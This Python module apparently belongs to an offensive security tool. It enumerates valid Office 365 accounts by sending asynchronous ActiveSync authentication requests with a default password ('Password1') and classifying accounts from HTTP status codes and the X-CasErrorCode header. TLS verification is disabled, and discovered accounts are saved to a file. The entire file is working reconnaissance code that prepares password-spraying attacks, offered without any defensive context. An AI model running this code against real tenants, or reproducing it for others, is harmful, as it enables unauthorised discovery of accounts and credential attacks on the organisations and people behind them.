#!/usr/bin/env python3

# Based on: https://bitbucket.org/grimhacker/office365userenum/

import sys
import urllib3
import asyncio
import requests
from .helper import Helper
from .colors import text_colors
from .settings import *
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Enumerator:
    """ Perform user enumeration using Microsoft Server ActiveSync """

    valid_accts = []  # Valid account storage
    helper = Helper() # Helper functions

    def __init__(self, args):
        self.settings = activesync
        self.args     = args
        self.proxy    = None if not args.proxy else {
            "http": args.proxy, "https": args.proxy
        }


    def shutdown(self, ctrl=True):
        if ctrl: print("\n[!] CTRL-C caught. Completing current queue...")
        self.helper.write_data(self.valid_accts, "%s/valid_accts.txt" % (self.args.output))


    async def run(self, loop, userlist, password="Password1"):
        """ Asynchronously send HTTP requests """
        futures = [loop.run_in_executor(
            None, self.enum, user, password
        ) for user in userlist]

        await asyncio.wait(futures)

    def enum(self, user, password):
        """ Enumerate users on Microsoft using Microsoft Server ActiveSync """
        try:
            email   = self.helper.check_email(user, self.args.domain)
            headers = {"MS-ASProtocolVersion": "14.0"}
            auth    = (email, password)
            rsp     = self.settings["method"](self.settings["url"], headers=headers, auth=auth, timeout=self.args.timeout, proxies=self.proxy, verify=False)

            status = rsp.status_code
            if status in [200, 401, 403]:
                sys.stdout.write("[%s%s-%d%s] %s%s\n" % (text_colors.green, "VALID_USER", status, text_colors.reset, email, self.helper.space))
                sys.stdout.flush()
                self.valid_accts.append(user)

            elif status == 404 and rsp.headers.get("X-CasErrorCode") == "UserNotFound":
                sys.stdout.write("[%s%s%s] %s%s\r" % (text_colors.red, "INVALID_USER", text_colors.reset, email, self.helper.space))
                sys.stdout.flush()

            else:
                sys.stdout.write("[%s%s%s] %s%s\r" % (text_colors.yellow, "UNKNOWN", text_colors.reset, email, self.helper.space))
                sys.stdout.flush()

        except Exception as e:
            if self.args.debug: print("\n[ERROR] %s" % e)
            pass